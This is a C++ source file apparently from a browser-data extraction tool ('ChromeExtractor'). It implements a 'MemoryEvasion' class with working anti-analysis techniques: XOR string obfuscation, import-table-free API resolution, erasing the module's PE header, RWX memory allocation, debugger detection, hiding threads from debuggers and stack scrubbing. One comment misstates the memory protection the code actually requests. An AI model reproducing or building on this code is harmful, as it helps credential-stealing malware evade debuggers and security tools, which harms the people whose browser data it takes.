#include "syscalls/syscall_resolver.h"
#include "evasion/memory_evasion.h"
#include "logger.h"
#include "peb_resolve.h"
#include <windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <cstring>

using namespace ChromeExtractor::Syscalls;

bool MemoryEvasion::m_initialized = false;

MemoryEvasion::MemoryEvasion() {
    m_initialized = true;
}

MemoryEvasion::~MemoryEvasion() {
}

void MemoryEvasion::SecureZeroMemory(void* ptr, size_t size) {
    // Use Windows SecureZeroMemory to prevent compiler optimizations
    ::SecureZeroMemory(ptr, size);

    g_logger.Debug("Securely zeroed " + std::to_string(size) + " bytes of memory");
}

bool MemoryEvasion::EncryptSensitiveMemory(
    void* data,
    size_t size,
    const std::vector<uint8_t>& encryption_key) {

    if (!data || size == 0 || encryption_key.empty()) {
        return false;
    }

    // XOR encryption with key rotation
    uint8_t* buffer = (uint8_t*)data;
    for (size_t i = 0; i < size; i++) {
        buffer[i] ^= encryption_key[i % encryption_key.size()];
    }

    g_logger.Debug("Encrypted " + std::to_string(size) + " bytes of sensitive memory");

    return true;
}

bool MemoryEvasion::DecryptSensitiveMemory(
    void* data,
    size_t size,
    const std::vector<uint8_t>& encryption_key) {

    if (!data || size == 0 || encryption_key.empty()) {
        return false;
    }

    // XOR is reversible
    return EncryptSensitiveMemory(data, size, encryption_key);
}

bool MemoryEvasion::LockMemoryPages(
    void* base_address,
    size_t size) {

    // Lock memory pages to prevent paging to disk
    auto pVL = IMP(VirtualLock);
    if (!pVL || !pVL(base_address, size)) {
        g_logger.Warning("Failed to lock memory pages");
        return false;
    }

    g_logger.Info("Memory pages locked: 0x" + std::to_string((uintptr_t)base_address));

    return true;
}

bool MemoryEvasion::UnlockMemoryPages(
    void* base_address,
    size_t size) {

    auto pVU = IMP(VirtualUnlock);
    if (!pVU || !pVU(base_address, size)) {
        g_logger.Warning("Failed to unlock memory pages");
        return false;
    }

    return true;
}

bool MemoryEvasion::DestroyModulePEHeader(HMODULE module_handle) {
    if (!module_handle) return false;

    const size_t HEADER_SIZE = 4096;
    auto pVP = IMP(VirtualProtect);
    if (!pVP) return false;
    DWORD old_protect = 0, dummy = 0;
    if (!pVP(module_handle, HEADER_SIZE, PAGE_READWRITE, &old_protect)) {
        g_logger.Warning("Failed to change protection on PE header");
        return false;
    }

    // Random fill via BCryptGenRandom — no plaintext pattern, no GetTickCount IAT
    BYTE* header = (BYTE*)module_handle;
    auto pRng = IMP(BCryptGenRandom);
    if (pRng) {
        // Fill in 512-byte chunks to stay within BCrypt limits
        for (size_t off = 0; off < HEADER_SIZE; off += 512)
            pRng(nullptr, header + off, (ULONG)min(512u, HEADER_SIZE - off), 2 /*BCRYPT_USE_SYSTEM_PREFERRED_RNG*/);
    } else {
        // Fallback: LCG seeded from stack pointer (no IAT call)
        DWORD rng = (DWORD)(uintptr_t)module_handle ^ (DWORD)(uintptr_t)&header;
        for (size_t i = 0; i < HEADER_SIZE; i++) {
            rng = rng * 1664525u + 1013904223u;
            header[i] = (BYTE)(rng >> 16);
        }
    }

    // Restore original protection (not PAGE_READONLY — that discards old_protect)
    pVP(module_handle, HEADER_SIZE, old_protect, &dummy);
    g_logger.Info("PE header randomized for module at 0x" + std::to_string((uintptr_t)module_handle));
    return true;
}

bool MemoryEvasion::IsValidPointer(PVOID ptr) {
    if (!ptr) return false;

    // Basic pointer validation
    // Check if address is within user-mode space
    if ((uintptr_t)ptr < 0x10000 || (uintptr_t)ptr > 0x7FFFFFFF0000) {
        return false;
    }

    return true;
}

PVOID MemoryEvasion::AllocateRandomizedMemory(size_t size) {
    // Allocate memory at randomized address (ASLR)

    auto pVA = IMP(VirtualAlloc);
    if (!pVA) return NULL;
    for (int attempt = 0; attempt < 10; attempt++) {
        // Allocate RW first; callers that need execution must re-protect via VirtualProtect
        PVOID allocation = pVA(
            NULL,
            size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        if (allocation) {
            g_logger.Debug("Allocated randomized memory at 0x" + std::to_string((uintptr_t)allocation));
            return allocation;
        }
    }

    g_logger.Warning("Failed to allocate randomized memory");
    return NULL;
}

void MemoryEvasion::ObfuscateString(
    char* str,
    size_t length,
    uint8_t xor_key) {

    if (!str || length == 0) return;

    for (size_t i = 0; i < length; i++) {
        str[i] ^= xor_key;
    }
}

void MemoryEvasion::DeobfuscateString(
    char* str,
    size_t length,
    uint8_t xor_key) {

    // XOR is reversible
    ObfuscateString(str, length, xor_key);
}

bool MemoryEvasion::SetAntiDebugFlags() {
    // Set exception handler for debugger detection

    // Check BeingDebugged flag
    PPEB peb = (PPEB)__readgsqword(0x60);

    if (peb->BeingDebugged) {
        g_logger.Warning("Process is being debugged");
        return false;
    }

    return true;
}

bool MemoryEvasion::HideThreadFromDebugger(HANDLE thread_handle) {
    typedef NTSTATUS(NTAPI* FnNtSetInfo)(HANDLE, ULONG, PVOID, ULONG);
    auto fn = PebResolve<FnNtSetInfo>(H_NTDLL, H_NtSIT);
    if (!fn) return false;
    return NT_SUCCESS(fn(thread_handle, 17, nullptr, 0));
}

void MemoryEvasion::OverwriteStack() {
    // Overwrite stack with cryptographically random data — rand() removed (predictable + IAT)
    volatile uint8_t dummy_buffer[4096];

    auto pRng = IMP(BCryptGenRandom);
    if (pRng) {
        pRng(nullptr, (BYTE*)const_cast<uint8_t*>(dummy_buffer), sizeof(dummy_buffer),
             2 /*BCRYPT_USE_SYSTEM_PREFERRED_RNG*/);
    } else {
        // Fallback: LCG from stack address
        DWORD rng = (DWORD)(uintptr_t)dummy_buffer;
        for (int i = 0; i < 4096; i++) {
            rng = rng * 1664525u + 1013904223u;
            dummy_buffer[i] = (uint8_t)(rng >> 16);
        }
    }

    // Keep reference to prevent compiler from eliding the fill
    volatile uint8_t temp = dummy_buffer[0];
    (void)temp;
}
